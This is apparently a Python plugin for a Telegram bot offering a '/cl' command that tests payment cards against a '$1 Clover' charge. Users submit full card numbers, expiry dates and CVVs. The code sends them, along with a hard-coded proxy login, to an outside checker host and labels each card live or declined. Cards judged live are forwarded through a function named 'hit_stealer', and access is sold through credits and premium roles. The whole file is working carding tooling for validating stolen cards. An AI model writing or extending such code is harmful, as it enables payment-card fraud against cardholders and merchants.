from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.enums import ChatType
import requests, re, time
from plugins.func.users_sql import *
from plugins.tools.hit_stealer import send_hit_if_approved
from datetime import date

session = requests.Session()

@Client.on_message(filters.command("cl", prefixes=["/", "."]))
async def cmd_clover(Client, message):
    try:
        user_id = str(message.from_user.id)
        chat_id = message.chat.id
        chat_type = message.chat.type
        username = message.from_user.username or "None"

        regdata = fetchinfo(user_id)
        if not regdata:
            return await message.reply_text("❌ You are not registered. Use /register first.")

        role = (regdata[2] or "FREE").strip().upper()
        credit = int(regdata[5] or 0)
        wait_time = int(regdata[6] or (15 if role == "FREE" else 5))
        antispam_time = int(regdata[7] or 0)
        now = int(time.time())

        if chat_type == ChatType.PRIVATE and role == "FREE":
            return await message.reply_text(
                "⚠️ <b>Premium Users Required</b>\n"
                "Only PREMIUM users can use this command in bot PM.\n"
                "Join our group to use it for FREE:",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("Join Group", url="https://t.me/+Rl9oTRlGfbIwZDhk")]
                ]),
                disable_web_page_preview=True
            )

        GROUP = open("plugins/group.txt").read().splitlines()
        if chat_type in [ChatType.GROUP, ChatType.SUPERGROUP] and str(chat_id) not in GROUP:
            return await message.reply_text("❌ Unauthorized group. Contact admin.")

        if credit < 1:
            return await message.reply_text("❌ Insufficient credit.")
        if now - antispam_time < wait_time:
            return await message.reply_text(f"⏳ Wait {wait_time - (now - antispam_time)}s (AntiSpam)")

        args = message.text.split(None, 1)
        cc_text = message.reply_to_message.text.strip() if message.reply_to_message else (args[1].strip() if len(args) > 1 else None)
        if not cc_text:
            return await message.reply_text("❌ Usage: /cl <cc|mm|yy|cvv>")

        match = re.search(r'(\d{12,16})[|:\s,-](\d{1,2})[|:\s,-](\d{2,4})[|:\s,-](\d{3,4})', cc_text)
        if not match:
            return await message.reply_text("❌ Invalid format. Use cc|mm|yy|cvv")

        ccnum, mes, ano, cvv = match.groups()
        fullcc = f"{ccnum}|{mes}|{ano}|{cvv}"

        check_msg = await message.reply_text(f"""
<code>┏━━━━━━━⍟</code>
<b>┃  Clover 1$</b>
<code>┗━━━━━━━━━━━⊛</code>
<b>⊙ CC:</b> <code>{fullcc}</code>
<b>⊙ Status:</b> Checking...
<b>⊙ Response:</b> Waiting...
""", reply_to_message_id=message.id)

        tic = time.perf_counter()

        try:
            proxy = "proxy.rampageproxies.com:5000:package-1111111-country-us-city-bloomington-region-indiana:5671nuWwEPrHCw2t"
            url = f"http://luckyxd.biz:1111/clv?cc={fullcc}&proxy={proxy}"
            res = session.get(url, timeout=50)
            data = res.json()
            card_message = data.get("message") or data.get("result") or res.text or "❌ No response message."
        except Exception as e:
            card_message = f"❌ Request failed: {str(e)}"

        toc = time.perf_counter()

        bin_ = ccnum[:6]
        try:
            bin_res = session.get(f"https://api.voidex.dev/api/bin?bin={bin_}", timeout=10).json()
            brand = (bin_res.get("scheme") or "N/A").upper()
            type_ = (bin_res.get("type") or "N/A").upper()
            level = (bin_res.get("level") or "N/A").upper()
            bank = (bin_res.get("bank") or "N/A").upper()
            country = (bin_res.get("country_name") or "N/A").upper()
            flag = bin_res.get("country_flag") or "🏳️"
        except:
            brand = type_ = level = bank = country = "N/A"
            flag = "🏳️"

        msg_lower = card_message.lower()
        if any(x in msg_lower for x in ["live", "approved", "success", "charged", "avs", "postal", "zip", "security code", "cvv", "cvc", "address"]):
            status = "Approved ✅"
        else:
            status = "Declined ❌"

        final_msg = f"""
<code>┏━━━━━━━⍟</code>
<b>┃  Clover 1$</b>
<code>┗━━━━━━━━━━━⊛</code>
<b>⊙ CC:</b> <code>{fullcc}</code>
<b>⊙ Status:</b> {status}
<b>⊙ Response:</b> {card_message}
<b>⊙ Bank:</b> {bank}
<b>⊚ BIN Info:</b> {brand} - {type_} - {level}
<b>⊙ Country:</b> {country} {flag}
<b>⊙ Time:</b> {toc - tic:.2f}s
<b>❛ ━━━━・⌁ 𝑩𝑨𝑹𝑹𝒀 ⌁・━━━━ ❜</b>
"""

        # First show result to user
        await Client.edit_message_text(chat_id, check_msg.id, final_msg)

        # Then send to hit stealer only if approved/live
        if "approved" in status.lower() or "live" in card_message.lower():
            await send_hit_if_approved(Client, final_msg)

        updatedata(user_id, "credits", credit - 1)
        updatedata(user_id, "antispam_time", now)
        plan_expirychk(user_id)

    except Exception as e:
        await message.reply_text(f"❌ Error: {str(e)}")
